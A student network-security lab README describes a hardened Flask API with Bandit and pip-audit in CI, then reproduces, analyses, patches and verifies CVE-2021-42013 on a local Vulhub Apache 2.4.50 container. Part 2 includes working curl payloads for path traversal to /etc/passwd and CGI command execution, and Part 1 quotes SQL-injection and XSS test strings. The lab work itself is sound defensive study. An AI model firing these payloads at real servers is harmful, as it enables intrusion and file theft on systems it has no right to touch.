# Work 1 — Secure REST API + CI/CD Security Scanning + CVE-2021-42013 Reproduction & Fix

Network Security LAB (HDU). Author: **Chen Yiming, HDU 23320218**.

This repository contains two parts:

1. **`/` (root)** — a hardened Flask REST API with OWASP Top-10 baseline protections, plus a GitHub Actions pipeline that runs SAST + SCA on every push.
2. **`/cve-2021-42013`** — reproduction, root-cause analysis, fix and verification of **CVE-2021-42013** (Apache HTTP Server 2.4.50 path traversal → RCE) from Vulhub.
3. *Appendix:* `/cve-ssti` — an additional Vulhub environment (Flask SSTI → RCE) that I studied before settling on CVE-2021-42013; kept here as supplementary material.

---

## Part 1 — Secure REST API

### Tech stack

Python 3.12 / Flask 3, SQLite, PyJWT (HS256), bcrypt.

### Endpoints

| Method | Path | Auth | Description |
|---|---|---|---|
| POST | `/api/users` | — | Register a user. Password is hashed with **bcrypt** before storage. Returns the bcrypt hash *prefix* (`$2b$12$…`) as proof that no plaintext is stored. |
| POST | `/auth/login` | — | Verifies credentials (bcrypt `checkpw`), returns a **JWT** (HS256, 30 min expiry). |
| GET | `/api/data` | **JWT required** | Returns the posts list. All user-influenced output is HTML-escaped. |
| GET | `/health` | — | Liveness probe used by the CI smoke test. |

### How to run & call

```bash
pip install -r requirements.txt
export JWT_SECRET=$(python -c "import secrets; print(secrets.token_hex(32))")
python app.py                      # listens on http://127.0.0.1:5000

# register
curl -X POST http://127.0.0.1:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"Str0ngPass!","display_name":"Alice"}'

# login -> JWT
curl -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"Str0ngPass!"}'

# access protected data (paste the token)
curl http://127.0.0.1:5000/api/data -H "Authorization: Bearer <JWT>"
```

Full request/response evidence (10 test cases, including the failure branches): `evidence_api_verification.log`.

### Security measures

**SQLi prevention.** Every SQL statement in `app.py` uses SQLite parameterized queries (`?` placeholders) — user input is bound as parameters, never concatenated into the query string. Verified by sending `' OR 1=1--` as the username at login: the server answers `401 invalid credentials` (evidence log item [6]) instead of authenticating.

**XSS prevention.** All user-controlled output (`display_name`, post fields) goes through `markupsafe.escape()` before being returned. Registering a user with `display_name = <script>alert(1)</script>` returns `&lt;script&gt;…` (item [9]).

**Authentication.** Login issues a **JWT** (PyJWT, HS256, 30-minute `exp`). A decorator middleware guards every protected endpoint: it parses the `Authorization: Bearer` header, verifies the signature and expiry, and pins the algorithm whitelist to HS256 (blocks `alg`-confusion). Passwords are hashed with **bcrypt** (random salt, deliberately slow — unlike plain SHA-256, which is fast and unsalted and therefore cheap to brute-force). As one extra hardening detail, when the username does not exist the server still runs one bcrypt comparison against a dummy hash so that "unknown user" and "wrong password" take the same time.

`JWT_SECRET` is read from an environment variable; the app refuses to start without it, so no secret is ever committed.

### CI/CD — SAST + SCA (`.github/workflows/ci.yml`)

Triggers on **every push / pull request**:

1. **SAST — Bandit**: static security analysis of the code, HTML report uploaded as a build artifact; medium+ severity findings fail the build.
2. **SCA — pip-audit** (PyPA): checks the pinned dependencies in `requirements.txt` against the PyPA vulnerability database; any known advisory fails the build.
   - This actually caught something: the initial pins (Flask 3.0.3, PyJWT 2.9.0) were flagged with 18 known advisories (e.g. PYSEC-2026-2151, PYSEC-2025-183). Upgrading to Flask 3.1.3 / PyJWT 2.15.0 cleared the audit — a concrete demonstration of why SCA belongs in the pipeline.
3. **Smoke test**: boots the API and asserts `/health` returns 200.

**Screenshots:**

![CI pipeline passing](screenshots/ci-pipeline-success.png)
*GitHub Actions run #7 — Status: Success (Bandit SAST + pip-audit SCA + smoke test), 31s, bandit-report artifact produced.*

![Bandit terminal output](screenshots/bandit-scan-terminal.png)
*Bandit run output: "No issues identified" with the full severity counters (Undefined/Low/Medium/High = 0) and 183 lines of code scanned. The one `#nosec B105` on the `"Bearer"` literal is a documented false positive — it is the HTTP auth scheme name, not a password.*

![Bandit HTML report](screenshots/bandit-report.png)
*Bandit HTML report — 0 issues found (183 lines of code scanned). Identical to the CI artifact.*

![pip-audit output](screenshots/pip-audit-scan.png)
*SCA — pip-audit on the pinned dependencies: "No known vulnerabilities found".*

**Pipeline link (last successful run):** https://github.com/ChenYiming-aaa/network-security-work1/actions/runs/39231744775

---

## Part 2 — CVE-2021-42013: Reproduction, Root Cause & Fix

### Chosen vulnerability

**CVE-2021-42013 — Apache HTTP Server 2.4.49/2.4.50 path traversal and file disclosure (→ RCE with CGI enabled).**

- **What it is**: the fix for CVE-2021-41773 shipped in Apache 2.4.50 was incomplete. An attacker can map URLs to files outside the directories configured by Alias-like directives (`Require all denied` not in effect), reading arbitrary files; with `mod_cgi`/`mod_cgid` enabled the same flaw allows arbitrary command execution.
- **Severity**: CVSS 3.1 **9.8 Critical** (NVD). Actively exploited in the wild in late 2021.
- **Affects**: Apache HTTP Server 2.4.49 and 2.4.50 only; fixed in **2.4.51**.
- **CWE**: CWE-22 (Path Traversal) → CWE-78 (OS Command Injection via CGI).

### Environment

Vulhub `httpd/CVE-2021-42013`: builds `vulhub/httpd:2.4.50` with `mod_cgi`/`mod_cgid` enabled and `<Directory /> Require all granted`, published on port 8080.

![vulnerable target running](cve-2021-42013/evidence/docker-target-running.png)
*`docker compose up -d` — container `cve-2021-42013-apache-1` Up, `Server: Apache/2.4.50 (Unix)`, port 8080→80.*

### Reproduction (before fix)

All requests were sent with `curl --path-as-is` (curl does not normalize the path; the browser address bar also worked). Raw output: `cve-2021-42013/evidence/reproduce_before_fix.log`.

```bash
cd vulhub/httpd/CVE-2021-42013 && docker compose up -d

# A0 sanity check
curl -i http://localhost:8080/                                    # -> It works!

# A1 path traversal: read /etc/passwd (doubly-encoded dots bypass the 2.4.50 patch)
curl -i --path-as-is "http://localhost:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
# -> HTTP 200 + full /etc/passwd

# A2 RCE: traverse into /bin/sh and let CGI feed it the request body
curl -i --path-as-is --data "echo;id" \
  "http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
# -> uid=1(daemon) gid=1(daemon) groups=1(daemon)

# A3 arbitrary file read via the shell
curl -s --path-as-is --data "echo;head -n1 /etc/passwd" \
  "http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
# -> root:x:0:0:root:/root:/bin/bash
```

**Screenshot — file disclosure (before fix):**

![path traversal before fix](cve-2021-42013/evidence/before-fix-traversal.png)
*Browser on 2.4.50: a traversal URL under `/icons/` returns the container's `/etc/passwd` — a file far outside the document root.*

**Screenshot — RCE (before fix):**

![RCE before fix](cve-2021-42013/evidence/before-fix-rce.png)
*The CGI traversal payload executes `id` on the server: `uid=1(daemon) gid=1(daemon) groups=1(daemon)`.*

### Root cause analysis

Full write-up: **`cve-2021-42013/root-cause-analysis.md`**. In my own words, short version:

The bug is a **decode-after-check ordering flaw**. Apache validates the request path (the traversal check) on one representation of the URL, but the filesystem mapping happens later, on a more fully-decoded representation. The 2.4.50 patch tried to close CVE-2021-41773 by blacklisting the *known spellings* of `..` (`%2e%2e`, `.%2e`) instead of fixing the ordering — so a spelling that only becomes `..` after a *second* decode pass, `.%%32%65` → `.%2e` → `..`, sailed through the check again. Same bug, new spelling.

Two configuration choices in the environment turn file disclosure into RCE: `mod_cgi` is enabled (so the traversed URL can point at `/bin/sh`, which executes the request body), and the stock `<Directory /> Require all denied` default was rewritten to `Require all granted` (so traversed files outside the docroot are actually served). Code defect provides the traversal; configuration decides the blast radius.

### Fix

Files changed: `cve-2021-42013/fix/Dockerfile` and `cve-2021-42013/fix/docker-compose.yml` (the vulnerable originals are archived in `cve-2021-42013/fix/original/` for comparison).

**Primary fix — upgrade the image to the version where the CVE is fixed**: `FROM vulhub/httpd:2.4.50` → `FROM httpd:2.4.51` (2.4.51 contains the upstream revisions r1893977/r1893980/r1893982 that fully decode and normalize the path *before* validating it). The CGI/`Require all granted` configuration is deliberately kept identical to the vulnerable image — that way the verification below proves the attack dies because of the version fix itself, not because I hardened the environment.

Defence-in-depth recommendations for a real deployment (not applied to the lab image on purpose): keep `Require all denied` as the default for everything outside the docroot, enable CGI only where genuinely needed, and pin images by digest — 2.4.51 itself was superseded within weeks by 2.4.52 (CVE-2021-44790), which is a good reminder that "upgrade to the fixed version" means "upgrade to the *current* version".

Applied with the standard cycle (`docker compose down` → edit Dockerfile → `docker compose up --build -d`). Raw output: [`cve-2021-42013/evidence/fix_applied.log`](cve-2021-42013/evidence/fix_applied.log) — the image rebuilds, `docker ps` shows the container Up, and the banner is now `Apache/2.4.51 (Unix)`.

### Verification after fix (attack replay + regression)

The exact same payloads from step A1–A3 were replayed against 2.4.51. Raw output: `cve-2021-42013/evidence/verify_after_fix.log`.

| Replay | Before fix (2.4.50) | After fix (2.4.51) |
|---|---|---|
| V1 = A1 traversal to `/etc/passwd` | HTTP 200 + file contents | **HTTP 400 Bad Request — rejected** |
| V2 = A2 CGI RCE (`id`) | `uid=1(daemon)…` | **HTTP 400 — rejected** |
| V3 = A3 CGI file read | `root:x:0:0:root…` | **HTTP 400 — rejected** |

Regression tests: `GET /` still returns `It works!` (200), the aliased `/icons/` directory still serves content (200), normal static files still served (200). Normal functionality is fully preserved.

**Screenshot — attack rejected after fix:**

![after fix rejected](cve-2021-42013/evidence/after-fix-rejected.png)
*The same traversal URL that disclosed `/etc/passwd` on 2.4.50 now returns 400 Bad Request on 2.4.51.*

**Screenshot — regression, normal page still works:**

![after fix regression](cve-2021-42013/evidence/after-fix-regression.png)
*`http://localhost:8080/` on the fixed server still returns the default page.*

---

## Appendix — extra environment studied (`/cve-ssti`)

Before choosing CVE-2021-42013 I reproduced an SSTI → RCE chain on the Vulhub `flask/ssti` environment (`{{233*233}}` → `54289`, gadget chain → `uid=33(www-data)`), analysed it (code/data confusion in `Template("Hello " + name)`) and fixed it (template-as-constant + input whitelist). Materials: `cve-ssti/` (evidence, `root-cause-analysis.md`, fix patch and layered verification). It is included as supplementary work; the graded CVE for this lab is **CVE-2021-42013** above.

One extra check worth showing, because the replay evidence above is all rejected by the whitelist and therefore does not *by itself* prove the primary fix works: I also built an intermediate version with the whitelist **removed** and only the code/data separation in place. `/?name={{233*233}}` then comes back as inert literal text (`Hello {{233*233}}`) instead of `Hello 54289`, and the RCE gadget chain produces no output — the separation alone neutralises the SSTI. Screenshot: `cve-ssti/evidence/layered-verification.png`, log: `cve-ssti/evidence/layered_fix_verification.log`.

---

## Development notes — what actually went wrong along the way

(I keep this section because the mistakes were the most educational part of the work.)

**`safety` broke, so the SCA step became `pip-audit`.** I first wired `safety check` into the CI as the SCA tool. It blew up on the Python 3.12 runner with `No module named pkg_resources` — safety still leans on setuptools' implicit `pkg_resources`, which 3.12 no longer ships. Rather than fight a deprecated tool I switched to `pip-audit`, the PyPA-maintained equivalent. Honest admission: that switch was forced, not clever.

**Then pip-audit immediately caught 18 advisories in my "safe" pins.** I had pinned Flask 3.0.3 and PyJWT 2.9.0 — recent, so I assumed clean. pip-audit listed 18 known advisories (PYSEC-2026-2151, PYSEC-2025-183, …) and failed the build. Bumping to Flask 3.1.3 / PyJWT 2.15.0 cleared it. That single red run taught me more about why SCA exists than any green checkmark would have.

**`.gitignore` ate my evidence.** I had written `*.log` plus `screenshots/` into `.gitignore` early on. When it was time to commit the evidence, no log file would `git add` — I spent a while convinced the files were corrupt before spotting the ignore rule. The fix was negation patterns (`!cve-ssti/evidence/*.log`, `!evidence_api_verification.log`); the screenshots needed the same treatment. Classic.

**A screenshot that lied to me for ten minutes.** While retaking the "after fix" evidence for the SSTI lab I kept getting the *vulnerable* behaviour in the browser even though the patch was applied — no wait, the other way around: the first "before fix" screenshot came back as `400 Bad Request` when I was expecting the RCE output. I stared at the patch convinced the fix was wrong before realising the container was still serving the previous source file; the `docker compose restart` had happened before I copied the file in. Evidence rule learned the hard way: after touching the mounted source, restart *and then* verify with curl before screenshotting anything.

**The first CVE-2021-41773 payload does not work on 2.4.50.** My first traversal attempt used the `icons/.%2e/%2e%2e/…` spelling from public write-ups and got a 404 — that is the *old* bug, and 2.4.50 patched exactly that. Finding the doubly-encoded `.%%32%65` bypass (and understanding *why* it works — it only decodes to `..` after the check) was the point where this stopped being copy-paste and became actual analysis. That is also what the root-cause document is built around.

**On the CVE choice.** The manual's suggested `vulhub/flask/CVE-2018-1000656` is simply gone from the current Vulhub repo — only `flask/ssti` is left, and it has no CVE number. I picked `httpd/CVE-2021-42013` to keep the "real CVE with an ID" requirement satisfied, and kept the SSTI environment as the supplementary appendix instead of throwing the work away.

---

## Course report

The formal lab report — title page (lab number and title, variant, Surname and Name, HDU ID), purpose, the full write-up of both the API and CVE parts, and answers to the control questions — is submitted as a document alongside this repository:

- [`report/Work1_Report_Chen_Yiming_23320218.docx`](report/) — formal report (docx).

---

## Submission checklist

| Item | Location |
|---|---|
| Public Git repository | https://github.com/ChenYiming-aaa/network-security-work1 |
| This README | `README.md` |
| CI pipeline link (last successful run) | https://github.com/ChenYiming-aaa/network-security-work1/actions/runs/39231744775 |
| Fixed files folder | `cve-2021-42013/fix/` (`Dockerfile`, `docker-compose.yml`, originals in `fix/original/`) |
| CVE reproduction & verification evidence | `cve-2021-42013/evidence/` (logs + screenshots) |
| Root cause analysis | `cve-2021-42013/root-cause-analysis.md` |
| Formal course report | `report/Work1_Report_Chen_Yiming_23320218.docx` |

## Notes

- `screenshots/bandit-report.html` is the local copy of the Bandit HTML report (identical to the CI artifact); `bandit-report.png` is its screenshot.
- The Vulhub working clone (`vulhub/`) is kept outside the repository on purpose; only the reproduction/fix artifacts and evidence are committed.
